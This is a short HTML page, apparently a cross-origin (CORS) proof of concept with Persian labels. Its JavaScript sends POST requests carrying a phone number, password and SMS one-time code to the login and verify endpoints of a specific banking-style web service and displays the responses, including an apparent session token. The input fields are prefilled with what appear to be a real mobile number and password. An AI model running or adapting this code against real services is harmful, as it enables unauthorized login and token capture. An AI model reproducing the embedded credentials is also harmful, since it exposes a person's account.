<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8">
  <title>CORS PoC</title>
</head>
<body>
<h1>CORS PoC</h1>

<p>تلفن، پسورد و کد پیامک را اینجا وارد کن.</p>

<label>Cell number:
  <input id="cell" value="09233950961">
</label><br><br>

<label>Password:
  <input id="pass" value="Ali138296">
</label><br><br>

<label>Activation code:
  <input id="code" value="">
</label><br><br>

<button id="btn-send">Send OTP (login)</button>
<button id="btn-verify">Verify OTP (login/verify)</button>

<pre id="out"></pre>

<script>
function log(msg) {
  document.getElementById('out').textContent = msg;
}

function makeBody() {
  return {
    cellNumber: document.getElementById('cell').value,
    password: document.getElementById('pass').value,
    activationCode: document.getElementById('code').value
  };
}

// مرحله ۱: ارسال OTP
document.getElementById('btn-send').onclick = function () {
  const data = makeBody();
  log('Sending /login ...');

  fetch("https://app.karafariniomid.com/security/token/neo/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  })
  .then(r => r.text())
  .then(t => log("Response /login:\n" + t))
  .catch(e => log("Error /login: " + e));
};

// مرحله ۲: تأیید OTP و دریافت توکن
document.getElementById('btn-verify').onclick = function () {
  const data = makeBody();
  log('Sending /login/verify ...');

  fetch("https://app.karafariniomid.com/security/token/neo/login/verify", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  })
  .then(r => r.text())
  .then(t => log("Response /login/verify:\n" + t))
  .catch(e => log("Error /login/verify: " + e));
};
</script>
</body>
</html>
